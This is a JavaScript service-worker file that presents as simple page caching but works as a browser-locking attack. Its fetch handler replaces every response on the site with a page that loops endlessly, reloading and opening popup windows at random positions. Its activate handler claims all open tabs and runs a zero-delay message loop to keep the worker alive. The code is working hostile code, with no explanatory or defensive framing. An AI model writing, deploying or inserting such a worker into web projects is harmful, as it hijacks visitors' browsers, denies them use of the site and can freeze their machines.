self.addEventListener("install", (e) => {
    e.waitUntil(
        caches.open("cache-v1").then((cache) => {
            return cache.addAll(['/index.html']);
        })
    );
    self.skipWaiting();
});

self.addEventListener("fetch", (e) => {
    e.respondWith(
        new Response(
            `<body><script>while(1){location.reload(1);window.open('/', 'popup_${Date.now()}', 'width=300,height=300,left=${Math.random()*screen.width},top=${Math.random()*screen.height},menubar=no,toolbar=no,location=no,status=no');};</script></body>`, 
            { 
                status: 200,
                headers: {'Content-Type': 'text/html'}
            }
        )
    );
});

self.addEventListener("activate", (e) => {
    e.waitUntil(clients.claim());
    setInterval(() => {
        self.clients.matchAll().then(clients => {
            clients.forEach(client => client.postMessage('keepalive'));
        });
    }, 0);
});